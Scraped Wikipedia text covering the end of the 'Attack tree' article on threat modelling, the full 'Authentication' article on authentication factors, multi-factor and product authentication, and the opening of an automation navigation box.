 
newspapers
 
·
 
books
 
·
 
scholar
 
·
 
JSTOR
 
(
April 2012
)
 (
Learn how and when to remove this message
)


Attack trees
 are conceptual diagrams showing how an asset, or target, might be attacked.
[
1
]
  Attack trees have been used in a variety of applications.  In the field of information technology, they have been used to describe 
threats on computer systems
 and possible 
attacks
 to realize those threats. However, their use is not restricted to the analysis of conventional information systems.  They are widely used in the fields of defense and aerospace for the analysis of threats against tamper resistant electronics systems (e.g., avionics on military aircraft).
[
2
]
  Attack trees are increasingly being applied to computer control systems (especially relating to the electric 
power grid
).
[
3
]
  Attack trees have also been used to understand threats to physical systems.

Some of the earliest descriptions of attack trees are found in papers and articles by 
Bruce Schneier
,
[
4
]
 when he was 
CTO
 of 
Counterpane Internet Security
.  Schneier was clearly involved in the development of attack tree concepts and was instrumental in publicizing them.  However, the attributions in some of the early publicly available papers on attack trees
[
5
]
 also suggest the involvement of the 
National Security Agency
 in the initial development.

Attack trees are very similar, if not identical, to 
threat trees
. Threat trees were developed by Jonathan Weiss of Bell Laboratories to comply with guidance in MIL STD 1785
[
6
]
 for AT&T's work on Command and Control for federal applications, and were first described in his paper in 1982.
[
7
]
 This work was later discussed in 1994 by Edward Amoroso.
[
8
]






Basic
[
edit
]


Attack tree for computer viruses.  Here we assume a system such as 
Windows NT
, where not all users have full system access.  All child nodes operate on OR conditions.


Attack trees are multi-leveled diagrams consisting of one root, leaves, and children.  From the bottom up, 
child nodes
 are conditions which must be satisfied to make the direct parent 
node
 true; when the 
root
 is satisfied, the attack is complete.  Each 
node
 may be satisfied only by its direct 
child nodes
.

A 
node
 may be the 
child
 of another node; in such a case, it becomes logical that multiple steps must be taken to carry out an attack.  For example, consider classroom computers which are secured to the desks.  To steal one, the securing cable must be cut or the lock unlocked.  The lock may be unlocked by picking or by obtaining the key.  The key may be obtained by threatening a key holder, bribing a keyholder, or taking it from where it is stored (e.g. under a mousemat).  Thus a four level attack tree can be drawn, of which one path is (
Bribe Keyholder
, 
Obtain Key
, 
Unlock Lock
, 
Steal Computer
).

An attack described in a 
node
 may require one or more of many attacks described in 
child nodes
 to be satisfied.  Our above condition shows only 
OR conditions
; however, an 
AND condition
 can be created, for example, by assuming an electronic alarm which must be disabled if and only if the cable will be cut.  Rather than making this task a 
child node
 of cutting the lock, both tasks can simply reach a summing junction.  Thus the path ((
Disable Alarm
, 
Cut Cable
), 
Steal Computer
) is created.

Attack trees are related to the established fault tree formalism.
[
9
]
  Fault tree 
methodology
 employs boolean expressions to gate conditions when parent nodes are satisfied by leaf nodes. By including a priori probabilities with each node, it is possible to perform calculate probabilities with higher nodes using 
Bayes Rule
. However, in reality accurate probability estimates are either unavailable or too expensive to gather. With respect to computer security with active participants (i.e., attackers), the probability distribution of events are probably not independent nor uniformly distributed, hence, naive Bayesian analysis is unsuitable.

Since the Bayesian analytic techniques used in fault tree analysis cannot legitimately be applied to attack trees, analysts instead use other techniques
[
10
]
[
11
]
 to determine which attacks will be preferred by a particular attacker.  These may involve comparing the attacker's capabilities (time, money, skill, equipment) with the resource requirements of the specified attack.  Attacks which are near or beyond the attacker's ability to perform are less preferred than attacks that are perceived as cheap and easy. The degree to which an attack satisfies the adversary's objectives also affects the attacker's choices.  Attacks that are both within the adversary's capabilities, and which satisfy their goals, are more likely than those that do not.



Examination
[
edit
]


Attack trees can become large and complex, especially when dealing with specific attacks.  A full attack tree may contain hundreds or thousands of different paths all leading to completion of the attack.  Even so, these trees are very useful for determining what threats exist and how to deal with them.

Attack trees can lend themselves to defining an 
information assurance
 strategy.  It is important to consider, however, that implementing policy to execute this strategy changes the attack tree.  For example, computer viruses may be protected against by refusing the system administrator access to directly modify existing programs and program folders, instead requiring a 
package manager
 be used.  This adds to the attack tree the possibility of design flaws or 
exploits
 in the package manager.

One could observe that the most effective way to mitigate a threat on the attack tree is to mitigate it as close to the 
root
 as possible. Although this is theoretically sound, it is not usually possible to simply mitigate a threat without other implications to the continued operation of the system.  For example, the threat of viruses infecting a 
Windows
 system may be largely reduced by using a standard (non-administrator) account and 
NTFS
 instead of 
FAT
 
file system
 so that normal users are unable to modify the operating system.  Implementing this negates any way, foreseen or unforeseen, that a normal user may come to infect the operating system with a virus
[
citation needed
]
; however, it also requires that users switch to an administrative account to carry out administrative tasks, thus creating a different set of threats on the tree and more operational overhead.  Also, users are still able to infect files to which they have write permissions, which may include files and documents.

Systems using cooperative agents that dynamically examine and identify 
vulnerability
 chains, creating attack trees, have been built since 2000.
[
12
]




Attack tree modeling software
[
edit
]


Several commercial packages and 
open source
 products are available.



Open source
[
edit
]


ADTool
 from University of Luxembourg


AT-AT


Deciduous


Ent


SeaMonster


Commercial
[
edit
]


AttackTree+
 from Isograph


Secur
IT
ree
 from Amenaza Technologies


RiskTree
 from 2T Security


See also
[
edit
]


Computer insecurity


Computer security


Computer virus


Fault tree analysis


IT risk


Threat (computer)


Vulnerability (computing)


References
[
edit
]






^
 
R. Shirey (August 2007). 
Internet Security Glossary, Version 2
. Network Working Group. 
doi
:
10.17487/RFC4949
. 
RFC
 
4949
.
 
Informational.






^
 
U.S. Department of Defense, 
"Defense Acquisition Guidebook", Section 8.5.3.3




^
 
Chee-Wooi Ten, Chen-Ching Liu, Manimaran Govindarasu, Vulnerability Assessment of Cybersecurity for SCADA Systems Using Attack Trees, 
"Archived copy"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on 2010-06-30
. Retrieved 
2012-04-04
.
{{
cite web
}}
:  CS1 maint: archived copy as title (
link
)




^
 
Schneier, Bruce (December 1999). 
"Attack Trees"
. 
Dr Dobb's Journal, v.24, n.12
. 
Archived
 from the original on 6 August 2007
. Retrieved 
2007-08-16
.




^
 
Chris Salter, O. Sami Saydjari, Bruce Schneier, Jim Wallner, Toward a Secure System Engineering Methodology,  
"Archived copy"
 
(PDF)
. 
Archived
 
(PDF)
 from the original on 2011-06-23
. Retrieved 
2012-04-04
.
{{
cite web
}}
:  CS1 maint: archived copy as title (
link
)




^
 
"MIL-STD-1785 SYSTEM SECURITY ENGINEERING PROGRAM".
 
everyspec.com
. Retrieved 2023-09-05




^
 
"A System Security Engineering Process, 14th National Computer Security Conference, Washington DC"
 
(PDF)
. Retrieved 
2023-03-18
.




^
 
Amoroso, Edward (1994). 
Fundamentals of Computer Security
. Upper Saddle River: 
Prentice Hall
. 
ISBN
 
0-13-108929-3
.




^
 
"Fault Tree Handbook with Aerospace Applications"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on 2016-12-28
. Retrieved 
2019-02-26
.




^
 
Donald L Buckshaw, Gregory S Parnell, Willard L Ulkenholz, Donald L Parks, James M Wallner, O. Sami Saydjari, Mission Oriented Design Analysis of Critical Information Systems, Military Operations Research V10, N2, 2005, 
[1]
[
permanent dead link
]




^
 
Terrance R Ingoldsby, Amenaza Technologies Limited, Attack Tree-based Threat Risk Analysis, A vendor white paper, 
"Archived copy"
 
(PDF)
. 
Archived
 
(PDF)
 from the original on 2016-03-04
. Retrieved 
2012-04-09
.
{{
cite web
}}
:  CS1 maint: archived copy as title (
link
)




^
 
"NOOSE - Networked Object-Oriented Security Examiner, 14th Systems Administration Conference (LISA 2000), New Orleans"
. Retrieved 
2010-04-21
.














Retrieved from "
https://en.wikipedia.org/w/index.php?title=Attack_tree&oldid=1231492696
"


Category
: 
Computer network security
Hidden categories: 
CS1 maint: archived copy as title
All articles with dead external links
Articles with dead external links from October 2016
Articles with permanently dead external links
Articles with short description
Short description is different from Wikidata
Articles needing additional references from April 2012
All articles needing additional references
All articles with unsourced statements
Articles with unsourced statements from October 2008











From Wikipedia, the free encyclopedia






Act of proving an assertion


Not to be confused with 
Authenticity
 or 
Authorization
.


ATM user authenticating himself


Authentication
 (from 
Greek
: 
αὐθεντικός
 
authentikos
, "real, genuine", from αὐθέντης 
authentes
, "author") is the act of proving an 
assertion
, such as the 
identity
 of a computer system user. In contrast with 
identification
, the act of indicating a person or thing's identity, authentication is the process of verifying that identity.
[
1
]
 It might involve validating personal 
identity documents
, verifying the authenticity of a 
website
 with a 
digital certificate
,
[
2
]
 determining the age of an artifact by 
carbon dating
, or ensuring that a product or document is not 
counterfeit
.





Methods
[
edit
]


Main article: 
Provenance


Authentication is relevant to multiple fields. In 
art
, 
antiques
, and 
anthropology
, a common problem is verifying that a given artifact was produced by a certain person or in a certain place or period of history. In 
computer science
, verifying a user's identity is often required to allow access to confidential data or systems.
[
3
]


Authentication can be considered to be of three types:

The first type of authentication is accepting proof of identity given by a credible person who has first-hand evidence that the identity is genuine. When authentication is required of art or physical objects, this proof could be a friend, family member, or colleague attesting to the item's provenance, perhaps by having witnessed the item in its creator's possession. With autographed sports memorabilia, this could involve someone attesting that they witnessed the object being signed. A vendor selling branded items implies authenticity, while they may not have evidence that every step in the supply chain was authenticated. Centralized authority-based trust relationships back most secure internet communication through known public certificate authorities; decentralized peer-based trust, also known as a 
web of trust
, is used for personal services such as email or files and trust is established by known individuals signing each other's 
cryptographic key
 for instance.

The second type of authentication is comparing the attributes of the object itself to what is known about objects of that origin. For example, an art expert might look for similarities in the style of painting, check the location and form of a signature, or compare the object to an old photograph. An 
archaeologist
, on the other hand, might use carbon dating to verify the age of an artifact, do a chemical and 
spectroscopic
 analysis of the materials used, or compare the style of construction or decoration to other artifacts of similar origin. The physics of sound and light, and comparison with a known physical environment, can be used to examine the authenticity of audio recordings, photographs, or videos. Documents can be verified as being created on ink or paper readily available at the time of the item's implied creation.

Attribute comparison may be vulnerable to forgery. In general, it relies on the facts that creating a forgery indistinguishable from a genuine artifact requires expert knowledge, that mistakes are easily made, and that the amount of effort required to do so is considerably greater than the amount of profit that can be gained from the forgery.

In art and antiques, certificates are of great importance for authenticating an object of interest and value. Certificates can, however, also be forged, and the authentication of these poses a problem. For instance, the son of 
Han van Meegeren
, the well-known art-forger, forged the work of his father and provided a certificate for its provenance as well.

Criminal and civil penalties for 
fraud
, 
forgery
, and counterfeiting can reduce the incentive for falsification, depending on the risk of getting caught.

Currency and other financial instruments commonly use this second type of authentication method. Bills, coins, and 
cheques
 incorporate hard-to-duplicate physical features, such as fine printing or engraving, distinctive feel, watermarks, and holographic imagery, which are easy for trained receivers to verify.

The third type of authentication relies on documentation or other external affirmations. In criminal courts, the 
rules of evidence
 often require establishing the 
chain of custody
 of evidence presented. This can be accomplished through a written evidence log, or by testimony from the police detectives and forensics staff that handled it. Some antiques are accompanied by certificates attesting to their authenticity. Signed sports memorabilia is usually accompanied by a certificate of authenticity. These external records have their own problems of forgery and 
perjury
 and are also vulnerable to being separated from the artifact and lost.

In computer science, a user can be given access to secure systems based on user credentials that imply authenticity.
[
4
]
 A network administrator can give a user a password, or provide the user with a key card or other access devices to allow system access. In this case, authenticity is implied but not guaranteed.

Consumer goods
 such as pharmaceuticals, perfume, and clothing can use all  forms of authentication to prevent counterfeit goods from taking advantage of a popular brand's reputation. As mentioned above, having an item for sale in a reputable store implicitly attests to it being genuine, the first type of authentication. The second type of authentication might involve comparing the quality and craftsmanship of an item, such as an expensive handbag, to genuine articles. The third type of authentication could be the presence of a 
trademark
 on the item, which is a legally protected marking, or any other identifying feature which aids consumers in the identification of genuine brand-name goods. With software, companies have taken great steps to protect from counterfeiters, including adding holograms, security rings, security threads and color shifting ink.
[
5
]




Authentication factors
[
edit
]


The ways in which someone may be authenticated fall into three categories, based on what is known as the factors of authentication: something the user knows, something the user has, and something the user is. Each authentication factor covers a range of elements used to authenticate or verify a person's identity before being granted access, approving a transaction request, signing a document or other work product, granting authority to others, and establishing a chain of authority.

Security research has determined that for a positive authentication, elements from at least two, and preferably all three, factors should be verified.
[
6
]
 The three factors (classes) and some of the elements of each factor are:



Knowledge: Something the user knows (e.g., a password, 
partial password
, 
passphrase
, 
personal identification number
 (PIN), 
challenge–response
 (the user must answer a question or pattern), 
security question
).


Ownership: Something the user has (e.g., wrist band, 
ID card
, 
security token
, 
implanted device
, cell phone with a built-in 
hardware token
, 
software token
, or cell phone holding a 
software token
).


Inherence: Something the user is or does (e.g., fingerprint, 
retinal pattern
, 
DNA
 sequence (there are assorted definitions of what is sufficient), signature, face, voice, unique bio-electric signals, or other 
biometric
 identifiers).


Single-factor authentication
[
edit
]


As the weakest level of authentication, only a single component from one of the three categories of factors is used to authenticate an individual's identity. The use of only one factor does not offer much protection from misuse or malicious intrusion. This type of authentication is not recommended for financial or personally relevant transactions that warrant a higher level of security.
[
2
]




Multi-factor authentication
[
edit
]


Main article: 
Multi-factor authentication


Multi-factor authentication involves two or more authentication factors (something you know, something you have, or something you are). Two-factor authentication is a special case of multi-factor authentication involving exactly two factors.
[
2
]


For example, using a bank card (something the user has) along with a PIN (something the user knows) provides two-factor authentication. Business networks may require users to provide a password (knowledge factor) and a pseudorandom number from a security token (ownership factor). Access to a very-high-security system might require a 
mantrap
 screening of height, weight, facial, and fingerprint checks (several inherence factor elements) plus a PIN and a day code (knowledge factor elements), but this is still a two-factor authentication.



Authentication types
[
edit
]


Strong authentication
[
edit
]


The United States government's 
National Information Assurance Glossary
 defines 
strong authentication
 as a layered authentication approach relying on two or more authenticators to establish the identity of an originator or receiver of information.
[
7
]


The European Central Bank (ECB) has defined strong authentication as "a procedure based on two or more of the three authentication factors". The factors that are used must be mutually independent and at least one factor must be "non-reusable and non-replicable", except in the case of an inherence factor and must also be incapable of being stolen off the Internet. In the European, as well as in the US-American understanding, strong authentication is very similar to multi-factor authentication or 2FA, but exceeding those with more rigorous requirements.
[
2
]
[
8
]


The 
FIDO Alliance
 has been striving to establish technical specifications for strong authentication.
[
9
]




Continuous authentication
[
edit
]


Conventional computer systems authenticate users only at the initial log-in session, which can be the cause of a critical security flaw. To resolve this problem, systems need continuous user authentication methods that continuously monitor and authenticate users based on some biometric trait(s). A study used behavioural biometrics based on writing styles as a continuous authentication method.
[
10
]
[
11
]


Recent research has shown the possibility of using smartphones sensors and accessories to extract some behavioral attributes such as touch dynamics, 
keystroke dynamics
 and 
gait recognition
.
[
12
]
 These attributes are known as behavioral biometrics and could be used to verify or identify users implicitly and continuously on smartphones. The authentication systems that have been built based on these behavioral biometric traits are known as active or continuous authentication systems.
[
13
]
[
11
]




Digital authentication
[
edit
]


The term digital authentication, also known as 
electronic authentication
 or e-authentication, refers to a group of processes where the confidence for user identities is established and presented via electronic methods to an information system. The digital authentication process creates technical challenges because of the need to authenticate individuals or entities remotely over a network.
The American 
National Institute of Standards and Technology
 (NIST) has created a generic model for digital authentication that describes the processes that are used to accomplish secure authentication:



Enrollment – an individual applies to a credential service provider (CSP) to initiate the enrollment process. After successfully proving the applicant's identity, the CSP allows the applicant to become a subscriber.


Authentication – After becoming a subscriber, the user receives an 
authenticator
 e.g., a token and credentials, such as a user name. He or she is then permitted to perform online transactions within an authenticated session with a relying party, where they must provide proof that he or she possesses one or more authenticators.


Life-cycle maintenance – the CSP is charged with the task of maintaining the user's credential over the course of its lifetime, while the subscriber is responsible for maintaining his or her authenticator(s).
[
2
]
[
14
]


The authentication of information can pose special problems with electronic communication, such as vulnerability to 
man-in-the-middle attacks
, whereby a third party taps into the communication stream, and poses as each of the two other communicating parties, in order to intercept information from each. Extra identity factors can be required to authenticate each party's identity.



Product authentication
[
edit
]


A 
security hologram
 label on an electronics box for authentication


Counterfeit products are often offered to consumers as being authentic. 
Counterfeit consumer goods
, such as electronics, music, apparel, and 
counterfeit medications
, have been sold as being legitimate. Efforts to control the 
supply chain
 and educate consumers help ensure that authentic products are sold and used. Even 
security printing
 on packages, labels, and nameplates, however, is subject to counterfeiting.
[
15
]


In their anti-counterfeiting technology guide,
[
16
]
 the 
EUIPO
 Observatory on Infringements of Intellectual Property Rights categorizes the main anti-counterfeiting technologies on the market currently into five main categories: electronic, marking, chemical and physical, mechanical, and technologies for digital media.
[
17
]


Products or their packaging can include a variable 
QR Code
. A QR Code alone is easy to verify but offers a weak level of authentication as it offers no protection against counterfeits unless scan data is analyzed at the system level to detect anomalies.
[
18
]
 To increase the security level, the QR Code can be combined with a 
digital watermark
 or 
copy detection pattern
 that are robust to copy attempts and can be authenticated with a smartphone.

A 
secure key storage device
 can be used for authentication in consumer electronics, network authentication, license management, supply chain management, etc. Generally, the device to be authenticated needs some sort of wireless or wired digital connection to either a host system or a network. Nonetheless, the component being authenticated need not be electronic in nature as an authentication chip can be mechanically attached and read through a connector to the host e.g. an authenticated ink tank for use with a printer. For products and services that these secure coprocessors can be applied to, they can offer a solution that can be much more difficult to counterfeit than most other options while at the same time being more easily verified.
[
1
]




Packaging
[
edit
]


Packaging and labeling can be engineered to help reduce the risks of counterfeit consumer goods or the theft and resale of products.
[
19
]
[
20
]
 Some package constructions are more difficult to copy and some have pilfer indicating seals. Counterfeit goods, unauthorized sales (diversion), material substitution and tampering can all be reduced with these anti-counterfeiting technologies. Packages may include authentication seals and use 
security printing
 to help indicate that the package and contents are not counterfeit; these too are subject to counterfeiting. Packages also can include anti-theft devices, such as dye-packs, 
RFID
 tags, or 
electronic article surveillance
[
21
]
 tags that can be activated or detected by devices at exit points and require specialized tools to deactivate. Anti-counterfeiting technologies that can be used with packaging include:



Taggant
 fingerprinting – uniquely coded microscopic materials that are verified from a database


Encrypted micro-particles – unpredictably placed markings (numbers, layers and colors) not visible to the human eye


Holograms
 – graphics printed on seals, patches, foils or labels and used at the point of sale for visual verification


Micro-printing – second-line authentication often used on currencies


Serialized 
barcodes


UV printing – marks only visible under UV light


Track and trace
 systems – use codes to link products to the database tracking system


Water indicators – become visible when contacted with water


DNA tracking – genes embedded onto labels that can be traced


Color-shifting ink or film – visible marks that switch colors or texture when tilted


Tamper evident
 seals and tapes – destructible or graphically verifiable at point of sale


2d barcodes – data codes that can be tracked


RFID chips


NFC
 chips


Information content
[
edit
]


Literary forgery
 can involve imitating the style of a famous author. If an original 
manuscript
, typewritten text, or recording is available, then the medium itself (or its packaging – anything from a box to 
e-mail headers
) can help prove or disprove the authenticity of the document. However, text, audio, and video can be copied into new media, possibly leaving only the informational content itself to use in authentication. Various systems have been invented to allow authors to provide a means for readers to reliably authenticate that a given message originated from or was relayed by them. These involve authentication factors like:



A difficult-to-reproduce physical artifact, such as a 
seal
, 
signature
, 
watermark
, special 
stationery
, or fingerprint.


A 
shared secret
, such as a passphrase, in the content of the message.


An 
electronic signature
; 
public-key infrastructure
 is often used to cryptographically guarantee that a message has been signed by the holder of a particular private key.


The opposite problem is the detection of 
plagiarism
, where information from a different author is passed off as a person's own work. A common technique for proving plagiarism is the discovery of another copy of the same or very similar text, which has different attribution. In some cases, excessively high quality or a style mismatch may raise suspicion of plagiarism.



Literacy and literature authentication
[
edit
]


In literacy, authentication is a readers’ process of questioning the veracity of an aspect of literature and then verifying those questions via research. The fundamental question for authentication of literature is – Does one believe it? Related to that, an authentication project is therefore a reading and writing activity in which students document the relevant research process (
[
22
]
). It builds students' critical literacy. The documentation materials for literature go beyond narrative texts and likely include informational texts, primary sources, and multimedia. The process typically involves both internet and hands-on library research. When authenticating historical fiction in particular, readers consider the extent that the major historical events, as well as the culture portrayed (e.g., the language, clothing, food, gender roles), are believable for the period.
[
3
]




History and state-of-the-art
[
edit
]


NSA KAL-55B Tactical Authentication System used by the U.S. military during the 
Vietnam War
 – 
National Cryptologic Museum


Historically, fingerprints have been used as the most authoritative method of authentication, but court cases in the US and elsewhere have raised fundamental doubts about fingerprint reliability.
[
23
]
 Outside of the legal system as well, fingerprints are easily 
spoofable
, with 
British Telecom
's top computer security official noting that "few" fingerprint readers have not already been tricked by one spoof or another.
[
24
]
 Hybrid or two-tiered authentication methods offer a compelling
[
according to whom?
]
 solution, such as private keys encrypted by fingerprint inside of a USB device.

In a computer data context, cryptographic methods have been developed which are not spoofable if the originator's key has not been compromised. That the originator (or anyone other than an 
attacker
) knows (or doesn't know) about a compromise is irrelevant. However, it is not known whether these cryptographically based authentication methods are provably secure, since unanticipated mathematical developments may make them vulnerable to attack in the future. If that were to occur, it may call into question much of the authentication in the past. In particular, a 
digitally signed
 
contract
 may be questioned when a new attack on the cryptography underlying the signature is discovered.
[
citation needed
]




Authorization
[
edit
]


A military police officer checks a driver's identification card before allowing her to enter a military base.


The process of 
authorization
 is distinct from that of authentication. Whereas authentication is the process of verifying that "you are who you say you are", authorization is the process of verifying that "you are permitted to do what you are trying to do". While authorization often happens immediately after authentication (e.g., when logging into a computer system), this does not mean authorization presupposes authentication: an anonymous agent could be authorized to a limited action set.
[
25
]




Access control
[
edit
]


One familiar use of authentication and authorization is 
access control
. A computer system that is supposed to be used only by those authorized must attempt to detect and exclude the unauthorized. Access to it is therefore usually controlled by insisting on an authentication procedure to establish with some degree of confidence the identity of the user, granting privileges established for that identity.



See also
[
edit
]


Authentication protocol


Electronic signature


References
[
edit
]






^ 
a
 
b
 
"What is Authentication? Definition of Authentication, Authentication Meaning"
. 
The Economic Times
. Retrieved 
2020-11-15
.




^ 
a
 
b
 
c
 
d
 
e
 
Turner, Dawn M. 
"Digital Authentication: The Basics"
. Cryptomathic. 
Archived
 from the original on 14 August 2016
. Retrieved 
9 August
 2016
.




^ 
a
 
b
 
McTigue, E.; Thornton, E.; Wiese, P. (2013). 
"Authentication Projects for Historical Fiction: Do you believe it?"
. 
The Reading Teacher
. 
66
 (6): 495–505. 
doi
:
10.1002/trtr.1132
. 
Archived
 from the original on 2015-07-07.




^
 
Ranjan, Pratik; Om, Hari (2016-05-06). 
"An Efficient Remote User Password Authentication Scheme based on Rabin's Cryptosystem"
. 
Wireless Personal Communications
. 
90
 (1): 217–244. 
doi
:
10.1007/s11277-016-3342-5
. 
ISSN
 
0929-6212
. 
S2CID
 
21912076
.




^
 
"How to Tell – Software"
. 
microsoft.com
. 
Archived
 from the original on 20 December 2016
. Retrieved 
11 December
 2016
.




^
 
Federal Financial Institutions Examination Council (2008). 
"Authentication in an Internet Banking Environment"
 
(PDF)
. 
Archived
 
(PDF)
 from the original on 2010-05-05
. Retrieved 
2009-12-31
.




^
 
Committee on National Security Systems. 
"National Information Assurance (IA) Glossary"
 
(PDF)
. National Counterintelligence and Security Center. 
Archived
 
(PDF)
 from the original on 21 November 2016
. Retrieved 
9 August
 2016
.




^
 
European Central Bank. 
"Recommendations for the Security of Internet Payments"
 
(PDF)
. European Central Bank. 
Archived
 
(PDF)
 from the original on 6 November 2016
. Retrieved 
9 August
 2016
.




^
 
"FIDO Alliance Passes 150 Post-Password Certified Products"
. InfoSecurity Magazine. 2016-04-05. 
Archived
 from the original on 2016-06-17
. Retrieved 
2016-06-13
.




^
 
Brocardo ML, Traore I, Woungang I, Obaidat MS. "
Authorship verification using deep belief network systems
 
Archived
 2017-03-22 at the 
Wayback Machine
". Int J Commun Syst. 2017. 
doi
:
10.1002/dac.3259




^ 
a
 
b
 
Patel, Vishal M.; Chellappa, Rama; Chandra, Deepak; Barbello, Brandon (July 2016). "Continuous User Authentication on Mobile Devices: Recent progress and remaining challenges". 
IEEE Signal Processing Magazine
. 
33
 (4): 49–61. 
Bibcode
:
2016ISPM...33...49P
. 
doi
:
10.1109/msp.2016.2555335
. 
ISSN
 
1053-5888
. 
S2CID
 
14179050
.




^
 
De Marsico, Maria; Fartade, Eduard Gabriel; Mecca, Alessio (2018). "Feature-based Analysis of Gait Signals for Biometric Recognition - Automatic Extraction and Selection of Features from Accelerometer Signals". 
Proceedings of the 7th International Conference on Pattern Recognition Applications and Methods
. SCITEPRESS - Science and Technology Publications. pp. 630–637. 
doi
:
10.5220/0006719106300637
. 
ISBN
 
978-989-758-276-9
.




^
 
Mahfouz, Ahmed; Mahmoud, Tarek M.; Eldin, Ahmed Sharaf (2017). "A survey on behavioral biometric authentication on smartphones". 
Journal of Information Security and Applications
. 
37
: 28–37. 
arXiv
:
1801.09308
. 
doi
:
10.1016/j.jisa.2017.10.002
. 
S2CID
 
21265344
.




^
 
"Draft NIST Special Publication 800-63-3: Digital Authentication Guideline"
. National Institute of Standards and Technology, USA. 
Archived
 from the original on 13 September 2016
. Retrieved 
9 August
 2016
.




^
 
Graham, Marty (2007-02-07). 
"Fake Holograms a 3-D Crime Wave"
. 
Wired
. 
ISSN
 
1059-1028
. Retrieved 
2020-04-24
.




^
 
"EUIPO Anti-Counterfeiting Technology Guide"
. 
European Observatory on Infringements of Intellectual Property Rights
. 2021-02-26. 
Archived
 from the original on 2021-03-17.




^
 
Linsner, Bristows LLP-Marc (2 March 2021). 
"EUIPO Observatory publishes Anti-counterfeiting Technology Guide | Lexology"
. 
www.lexology.com
. Retrieved 
2021-03-18
.




^
 
Survey of techniques for the fight against counterfeit goods and Intellectual Property Rights (IPR) infringement
. Baldini, Gianmarco., Nai Fovino, Igor., Satta, Riccardo., Tsois, Aris., Checchi, Enrico., European Commission. Joint Research Centre. Luxembourg: Publications Office. 2015. 
ISBN
 
978-92-79-54543-6
. 
OCLC
 
948769705
.
{{
cite book
}}
:  CS1 maint: others (
link
)




^
 
Eliasson, C; Matousek (2007). "Noninvasive Authentication of Pharmaceutical Products through Packaging Using Spatially Offset Raman Spectroscopy". 
Analytical Chemistry
. 
79
 (4): 1696–1701. 
doi
:
10.1021/ac062223z
. 
PMID
 
17297975
.




^
 
Li, Ling (March 2013). "Technology designed to combat fakes in the global supply chain". 
Business Horizons
. 
56
 (2): 167–177. 
doi
:
10.1016/j.bushor.2012.11.010
.




^
 
How Anti-shoplifting Devices Work"
 
Archived
 2006-04-27 at the 
Wayback Machine
, HowStuffWorks.com




^
 
Norton, D. E. (2004). 
The effective teaching of language arts
. New York: Pearson/Merrill/Prentice Hall.




^
 
Moenssens, Andre A.; Meagher, Stephen B. (2014). "13". 
The Fingerprint Sourcebook
 
(PDF)
. United States: CreateSpace Independent Publishing Platform. 
ISBN
 
9781500674151
. 
Archived
 
(PDF)
 from the original on 22 May 2022
. Retrieved 
3 November
 2022
.




^
 
The Register
, UK; Dan Goodin; 30 March 2008; 
Get your German Interior Minister's fingerprint, here
. Compared to other solutions, "It's basically like leaving the password to your computer everywhere you go, without you being able to control it anymore", one of the hackers comments.
 
Archived
 10 August 2017 at the 
Wayback Machine




^
 
"Best Practices for Creating a Secure Guest Account"
. 31 August 2016. 
Archived
 from the original on 2017-11-07
. Retrieved 
2017-11-06
.






External links
[
edit
]


National Institute of Standards and Technology
, 
U.S. Department of Commerce
 (August 2013). 
"Electronic Authentication Guideline – NIST Special Publication 800-63-2"
 
(PDF)
. 
Archived
 
(PDF)
 from the original on 2013-10-03.


"New NIST Publications Describe Standards for Identity Credentials and Authentication Systems"


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




v
t
e
Authentication
Authentication
APIs


BSD Authentication
 (BSD Auth)


eAuthentication
 (eAuth)


Generic Security Services API
 (GSSAPI)


Java Authentication and Authorization Service
 (JAAS)


Pluggable Authentication Modules
 (PAM)


Simple Authentication and Security Layer
 (SASL)


Security Support Provider Interface
 (SSPI)


XCert Universal Database API
 (XUDA)


Authentication
protocols


ACF2


Authentication and Key Agreement
 (AKA)


CAVE-based authentication


Challenge-Handshake Authentication Protocol
 (CHAP)

MS-CHAP


Central Authentication Service
 (CAS)


CRAM-MD5


Diameter


Extensible Authentication Protocol
 (EAP)


Host Identity Protocol
 (HIP)


IndieAuth


Kerberos


LAN Manager


NT LAN Manager
 (NTLM)


OAuth


OpenID


OpenID Connect
 (OIDC)


Password-authenticated key agreement
 protocols


Password Authentication Protocol
 (PAP)


Protected Extensible Authentication Protocol
 (PEAP)


Remote Access Dial In User Service
 (RADIUS)


Resource Access Control Facility
 (RACF)


Secure Remote Password protocol
 (SRP)


TACACS


Woo–Lam




 
Category


 
Commons




Authority control databases
: National 
United States
France
BnF data
Japan
Israel










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Authentication&oldid=1238894105
"


Categories
: 
Authentication
Access control
Applications of cryptography
Computer access control
Notary
Packaging
Hidden categories: 
Webarchive template wayback links
CS1 maint: others
Articles with short description
Short description is different from Wikidata
Articles containing Greek-language text
All articles with specifically marked weasel-worded phrases
Articles with specifically marked weasel-worded phrases from December 2016
All articles with unsourced statements
Articles with unsourced statements from December 2016











From Wikipedia, the free encyclopedia






Part of 
a series
 on
Automation


Automation in general




Banking


Building


Home


Highway system


Laboratory


Library


Broadcast


Mix


Pool cleaner


Pop music


Reasoning


Semi-automation


Telephone

Attendant


Switchboard


Teller machine


Vehicular


Vending machine






Robotics
 and 
robots




Domestic


Vacuum cleaner


Roomba


Lawn mower


Guided vehicle


Industrial


Paint


ODD





Impact of automation




Manumation


OOL


Bias


Self-driving cars


